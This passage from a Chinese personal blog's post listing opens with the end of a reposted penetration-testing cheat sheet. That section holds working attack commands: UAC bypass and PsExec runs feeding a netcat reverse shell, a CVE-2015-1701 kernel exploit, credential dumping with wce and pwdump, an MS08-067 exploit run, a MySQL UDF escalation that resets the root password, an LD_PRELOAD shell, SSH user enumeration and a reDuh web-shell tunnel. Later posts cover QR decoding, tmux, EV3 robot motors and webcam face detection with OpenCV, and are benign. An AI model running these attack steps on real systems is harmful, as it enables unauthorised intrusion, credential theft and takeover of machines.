以系统权限使用 Akagi64 运行 danger.exe </div><div class="line">Akagi64.exe 1 C:\Users\User\Desktop\danger.exe</div><div class="line"></div><div class="line"># 在 Kali 上创建监听</div><div class="line">nc -lvp 4444</div><div class="line"></div><div class="line"># 下一步就会反弹给我们一个提过权的 shell</div><div class="line"># 以系统权限使用 PsExec 运行 danger.exe </div><div class="line">psexec.exe –i –d –accepteula –s danger.exe</div></pre></td></tr></table></figure>
<h3 id="以普通用户身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以普通用户身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以普通用户身份在 Win7 上反弹具有系统权限的 Shell"></a>以普通用户身份在 Win7 上反弹具有系统权限的 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</div><div class="line"></div><div class="line">https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</div><div class="line"></div><div class="line"></div><div class="line">https://www.exploit-db.com/exploits/37049/</div><div class="line"></div><div class="line"># 查找目标机器是否安装了补丁，输入如下命令</div><div class="line">wmic qfe get</div><div class="line">wmic qfe | find &quot;3057191&quot;</div><div class="line"></div><div class="line"># 上传编译后的利用程序并运行它</div><div class="line"></div><div class="line">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</div><div class="line"></div><div class="line"># 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe</div><div class="line"># https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 &quot;main.c&quot;</div><div class="line"></div><div class="line"># 使用 wce.exe 获取已登录用户的明文账号密码</div><div class="line"></div><div class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</div><div class="line"></div><div class="line">wce -w</div><div class="line"></div><div class="line"># 使用 pwdump7 获取其他用户的密码哈希值</div><div class="line"></div><div class="line">http://www.heise.de/download/pwdump.html</div><div class="line"></div><div class="line"># we can try online hash cracking tools such crackstation.net</div></pre></td></tr></table></figure>
<h3 id="MS08-067-–-不使用-Metasploit"><a href="#MS08-067-–-不使用-Metasploit" class="headerlink" title="MS08-067 – 不使用 Metasploit"></a>MS08-067 – 不使用 Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205</div><div class="line">$ searchsploit ms08-067</div><div class="line">$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1</div></pre></td></tr></table></figure>
<h3 id="通过-MySQL-Root-账户实现提权"><a href="#通过-MySQL-Root-账户实现提权" class="headerlink" title="通过 MySQL Root 账户实现提权"></a>通过 MySQL Root 账户实现提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</div><div class="line">$ wget 0xdeadbeef.info/exploits/raptor_udf2.c</div><div class="line">$ gcc -g -c raptor_udf2.c</div><div class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</div><div class="line">mysql -u root -p</div><div class="line">mysql&gt; use mysql;</div><div class="line">mysql&gt; create table foo(line blob);</div><div class="line">mysql&gt; insert into foo values(load_file(&apos;/home/user/raptor_udf2.so&apos;));</div><div class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;;</div><div class="line">mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;</div><div class="line">mysql&gt; select * from mysql.func;</div><div class="line">mysql&gt; select do_system(&apos;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&apos;);</div><div class="line"></div><div class="line">user:~$ su -</div><div class="line">Password:</div><div class="line">user:~# whoami</div><div class="line">root</div><div class="line">root:~# id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div></pre></td></tr></table></figure>
<h3 id="使用-LD-PRELOAD-注入程序"><a href="#使用-LD-PRELOAD-注入程序" class="headerlink" title="使用 LD_PRELOAD 注入程序"></a>使用 LD_PRELOAD 注入程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ wget https://github.com/jivoi/pentest/ldpreload_shell.c</div><div class="line">$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so</div><div class="line">$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft</div></pre></td></tr></table></figure>
<h3 id="针对-OpenSSH-用户进行枚举时序攻击"><a href="#针对-OpenSSH-用户进行枚举时序攻击" class="headerlink" title="针对 OpenSSH 用户进行枚举时序攻击"></a>针对 OpenSSH 用户进行枚举时序攻击</h3><p>注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 shotgun 在知乎上的解释。</p>
<p>osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># https://github.com/c0r3dump3d/osueta</div><div class="line">$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes</div><div class="line">$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt</div></pre></td></tr></table></figure></p>
<h3 id="使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道"><a href="#使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道" class="headerlink" title="使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道"></a>使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</h3><p>注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p>
<p>对了亲～ReDuh-Gui 号称端口转发神器哦。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"># https://github.com/sensepost/reDuh</div><div class="line"></div><div class="line"># 步骤 1</div><div class="line"># 上传 reDuh.jsp 目标服务器</div><div class="line">$ http://192.168.10.50/uploads/reDuh.jsp</div><div class="line"></div><div class="line"># 步骤 2</div><div class="line"># 在本机运行 reDuhClient </div><div class="line">$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp</div><div class="line"></div><div class="line"># 步骤 3</div><div class="line"># 使用 nc 连接管理端口</div><div class="line">$ nc -nvv 127.0.0.1 1010</div><div class="line"></div><div class="line"># 步骤 4</div><div class="line"># 使用隧道转发本地端口到远程目标端口</div><div class="line">[createTunnel] 7777:172.16.0.4:3389</div><div class="line"></div><div class="line"># 步骤 5</div><div class="line"># 使用 RDP 连接远程</div><div class="line">$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777</div></pre></td></tr></table></figure></p>
<p>转载自FreeBuf黑客与极客（FreeBuf.COM）</p>
<p>原文：<a href="http://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/" target="_blank" rel="external">http://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/04/24/python2-python3-二维码识别/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/04/24/python2-python3-二维码识别/" itemprop="url">
                  python2 python3 zbarlight 二维码识别
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-24T16:18:11+08:00">
                2017-04-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>二维码识别：</p>
<p><a href="https://github.com/Polyconseil/zbarlight" target="_blank" rel="external">https://github.com/Polyconseil/zbarlight</a></p>
<p>sudo apt-get install libzbar0 libzbar-dev<br>sudo pip3 install zbarlight</p>
<p>也可以用python2，基本一样。</p>
<p>version1  test.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from PIL import Image</div><div class="line">import zbarlight</div><div class="line"></div><div class="line">file_path = &apos;test.png&apos;</div><div class="line">with open(file_path, &apos;rb&apos;) as image_file:</div><div class="line">    image = Image.open(image_file)</div><div class="line">    image.load()</div><div class="line"></div><div class="line">codes = zbarlight.scan_codes(&apos;qrcode&apos;, image)</div><div class="line">print(&apos;QR codes: %s&apos; % codes)</div><div class="line">输出：</div><div class="line">user@ubuntu:~/ZbarLighr$ python3 test.py </div><div class="line">QR codes: [b&apos;https://y.qq.com/m/client/run_radio/share.html?from=history&amp;guestuin=NjA1OTcxMDgx&apos;]</div><div class="line">user@ubuntu:~/ZbarLighr$</div></pre></td></tr></table></figure></p>
<p>version2  test.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">改进：格式化输出的数据</div><div class="line">import zbarlight</div><div class="line">from PIL import Image</div><div class="line"></div><div class="line">file_path = &apos;canvas.png&apos;</div><div class="line">with open(file_path, &apos;rb&apos;) as image_file:</div><div class="line">    image = Image.open(image_file)</div><div class="line">    image.load()</div><div class="line">codes = zbarlight.scan_codes(&apos;qrcode&apos;, image)</div><div class="line">codes = str(codes[0], encoding=&quot;utf-8&quot;)</div><div class="line">print(&apos;QR codes: %s&apos; % codes)</div></pre></td></tr></table></figure></p>
<p>version3  QR-mjpeg.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">获取mjpeg图像，先保存在本地，然后识别输出</div><div class="line">import requests</div><div class="line">from PIL import Image</div><div class="line">import zbarlight</div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(&quot;http://192.168.43.178:8080/?action=snapshot&quot;, stream=True)</div><div class="line">if r.status_code == 200:</div><div class="line">    with open(&apos;QRjpg.jpg&apos;, &apos;wb&apos;) as f:</div><div class="line">        for chunk in r.iter_content(chunk_size=1024):</div><div class="line">            if chunk:</div><div class="line">                f.write(chunk)</div><div class="line"></div><div class="line">file_path = &apos;QRjpg.jpg&apos;</div><div class="line">with open(file_path, &apos;rb&apos;) as image_file:</div><div class="line">    image = Image.open(image_file)</div><div class="line">    image.load()</div><div class="line"></div><div class="line">codes = zbarlight.scan_codes(&apos;qrcode&apos;, image)</div><div class="line">codes = str(codes[0], encoding=&quot;utf-8&quot;)</div><div class="line"></div><div class="line">print(&apos;QR codes: %s&apos; %codes)</div></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/04/24/tmux-安装及基本使用/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/04/24/tmux-安装及基本使用/" itemprop="url">
                  tmux 安装及基本使用
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-24T16:14:28+08:00">
                2017-04-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>tmux 基本操作</p>
<p>安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install tmux</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">tmux new -s session_name//创建一个会话</div><div class="line">tmux attach-session</div><div class="line">tmux attach-session -t session//连接某个session</div><div class="line"></div><div class="line">在进入tmux模式后，</div><div class="line">ctrl+b d 关闭tmux会话模式</div><div class="line">ctrl+b s 选择会话窗口</div><div class="line">ctrl+b n 切换的下一个会话</div></pre></td></tr></table></figure>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/04/11/python-ev3-一些基本命令记录/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/04/11/python-ev3-一些基本命令记录/" itemprop="url">
                  python + ev3 一些基本命令记录
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-11T16:44:17+08:00">
                2017-04-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="python-ev3-基本控制"><a href="#python-ev3-基本控制" class="headerlink" title="python + ev3 基本控制"></a>python + ev3 基本控制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">ev3dev.ev3</div><div class="line">ev3dev.core</div><div class="line"></div><div class="line">Ultrasonic Sensor</div><div class="line">超声波传感器</div><div class="line"></div><div class="line">Us = Ultrasonic Sensor()</div><div class="line">Us.value()</div><div class="line">//输出测量值</div><div class="line"></div><div class="line"></div><div class="line">TouchSensor</div><div class="line">触碰传感器</div><div class="line">s = ev3.TouchSensor()</div><div class="line">while True:</div><div class="line">    ev3.Leds.set_color(ev3.Leds.LEFT, (ev3.Leds.GREEN, ev3.Leds.RED)[ts.value()])</div><div class="line">//按下按键后，ev3按键上的灯光由绿变红</div><div class="line"></div><div class="line"></div><div class="line">Gyro Sensor</div><div class="line">陀螺仪</div><div class="line">Gy = ev3.GyroSensor()</div><div class="line">while True:</div><div class="line">	print(ev3.value())</div><div class="line"></div><div class="line"></div><div class="line">电机</div><div class="line">Running a motor</div><div class="line">m = ev3.LargeMotor(&apos;outA&apos;)</div><div class="line">m.run_timed(time_sp=3000, speed_sp=500)</div><div class="line"></div><div class="line"></div><div class="line">Sound</div><div class="line">输出声音</div><div class="line">ev3.Sound.speak(&apos;Welcome to the E V 3 dev project!&apos;).wait()</div></pre></td></tr></table></figure>
<p>================================================================<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"> Motor</div><div class="line">speed_sp    -900~+900</div><div class="line"></div><div class="line"> 给定角度	//电机转动角度</div><div class="line">run_to_rel_pos(position_sp=&lt;angle in degrees&gt;, speed_sp=&lt;value&gt;)//如果要倒退，在position_sp设置负数，这个函数，speed_sp不允许为负数</div><div class="line">m = LargeMotor(&apos;outB&apos;)</div><div class="line">m.run_to_rel_pos(position_sp=360, speed_sp=900, stop_action=&quot;hold&quot;)</div><div class="line"></div><div class="line"> 指定时间</div><div class="line">run_timed(time_sp=&lt;time in milliseconds&gt;, speed_sp=&lt;value&gt;)</div><div class="line">m = LargeMotor(&apos;outB&apos;)</div><div class="line">m.run_timed(time_sp=3000, speed_sp=-750)</div><div class="line">print(&quot;set speed (speed_sp) = &quot; + str(m.speed_sp))</div><div class="line">sleep(1)  # it takes a moment for the motor to start moving</div><div class="line">print(&quot;actual speed = &quot; + str(m.speed))</div><div class="line">sleep(4)				//sleep4+1  是因为要让电机有足够的时间启动。否则这个程序运行就直接结束，电机来不及反应。</div><div class="line"></div><div class="line"> 一直走</div><div class="line">run_forever(speed_sp=&lt;value&gt;)</div><div class="line">use stop() or stop(stop_action=&lt;value&gt;) value can be &apos;coast&apos;, &apos;break&apos;, &apos;hold&apos;</div></pre></td></tr></table></figure></p>
<p>m.run_forever(speed_sp=200)   # equivalent to power=20 in EV3-G<br>sleep(5)<br>m.stop(stop_action=”coast”)<br>sleep(4)</p>
<p>m.run_forever()<br>sleep(5)<br>m.stop()<br>sleep(4)<br><figure class="highlight plain"><figcaption><span>run_forever()  and  stop()</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> 等待命令执行完成</div><div class="line">motor = LargeMotor(&apos;outC&apos;)</div><div class="line">motor.run_timed(time_sp=3000, speed_sp=-750, stop_action=&apos;brake&apos;)</div><div class="line">motor.wait_while(&apos;running&apos;)//会等待running动作运行完成才停止（才开始执行下面的代码）</div><div class="line"></div><div class="line">Sound.beep()//发出哔哔声</div></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/03/28/使用摄像头-python进行人脸检测/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/03/28/使用摄像头-python进行人脸检测/" itemprop="url">
                  使用摄像头+Python进行人脸检测
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-28T20:37:41+08:00">
                2017-03-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="使用摄像头-Python进行人脸检测"><a href="#使用摄像头-Python进行人脸检测" class="headerlink" title="使用摄像头+Python进行人脸检测"></a>使用摄像头+Python进行人脸检测</h2><p>翻译自：<br><a href="https://realpython.com/blog/python/face-detection-in-python-using-a-webcam/" target="_blank" rel="external">https://realpython.com/blog/python/face-detection-in-python-using-a-webcam/</a></p>
<p>译者：nina</p>
<hr>
<p>这篇博客文章是《25行python代码实现人脸识别》的后续，所以确保你已经阅读过了那篇文章。</p>
<p>如前篇文章所述，我们可以很容易地把图像中检测人脸的技术通过摄像头应用到视频中–这就是这篇文章将会详细介绍的。</p>
<pre><code>在你在评论区提任何问题前：
    1.不要忽略这篇文章就尝试运行代码.你一定要理解代码不仅正确的运行也要对它进行故障排除.
    2.确保你使用的是OpenCV v2.
    3.你需要一个正常工作的摄像头来正确地运行这些脚本.
    4.看看别人的评论或问题,可能你的问题已经解决.
</code></pre><p>需要准备的：<br>    1、安装OpenCV（详细请看以前的文章）<br>    2、一个可以工作的摄像头</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>让我们直接解读代码，从这个<a href="https://github.com/shantnu/Webcam-Face-Detect" target="_blank" rel="external">github仓库</a>获取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">import cv2</div><div class="line">import sys</div><div class="line"></div><div class="line">cascPath = sys.argv[1]</div><div class="line">faceCascade = cv2.CascadeClassifier(cascPath)</div><div class="line"></div><div class="line">video_capture= cv2.VideoCapture(0)</div><div class="line"></div><div class="line">while True:</div><div class="line">	# 逐帧抓取</div><div class="line">	ret, frame = video_capture.read()</div><div class="line">	gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</div><div class="line">	</div><div class="line">	faces = faceCascade.detectMultiScale(</div><div class="line">		gray,</div><div class="line">		scaleFactor=1.1,</div><div class="line">		minNeighbors=5,</div><div class="line">		minSize=(30, 30),</div><div class="line">		flags=cv2.cv.CV_HAAR_SCALE_IMAGE</div><div class="line">		)</div><div class="line">		</div><div class="line">	# 在脸部周围画矩形</div><div class="line">	for (x, y, w, h) in faces:</div><div class="line">	cv2.rectangle(frame, (x,y), (x+w, y+h), (0, 255, 0), 2)</div><div class="line">	</div><div class="line">	# 显示处理过的结果</div><div class="line">	cv2.imshow(&apos;Video&apos;, frame)</div><div class="line">	</div><div class="line">	if cv2.waitKey(1) &amp; 0xFF == ord(&apos;q&apos;):</div><div class="line">		break</div><div class="line">		</div><div class="line">	# 当所有结束，释放捕获动作</div><div class="line">	</div><div class="line">video_capture.release()</div><div class="line">cv2.destoryAllwindows()</div></pre></td></tr></table></figure></p>
<p>现在，我们分解这些代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">import cv2</div><div class="line">import sys</div><div class="line"></div><div class="line">cascPath = sys.argv[1]</div><div class="line">faceCascade = cv2.CascadeClassifier(cascPath)</div></pre></td></tr></table></figure></p>
<p>你对这个应该很熟悉。我们正在创建一个face cascade（脸部级联），就像我们在图片的例子上做的一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">video_capture = cv2.VideoCapture(0)</div></pre></td></tr></table></figure></p>
<p>这一行将视频源设置为默认摄像头，OpenCV可以很简单地获取它。<br>    注意：你也可以给它一个文件名，Python会读视频文件。然而，由于OpenCV自身不能解码解压视频，你需要安装ffmpeg。ffmpeg作为OpenCV的前端，并且理想情况下，视频会被直接编码给OpenCV使用。这不容易做到，尤其是在Windows。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">while True:</div><div class="line">    # Capture frame-by-frame</div><div class="line">    ret, frame = video_capture.read()</div></pre></td></tr></table></figure>
<p>这里，我们捕获到了视频。read()函数从视频文件里读取一帧，在本例中，视频文件是摄像头。这个会返回：<br>1、读取实时视频帧（每次循环读取一帧）<br>2、一个返回值</p>
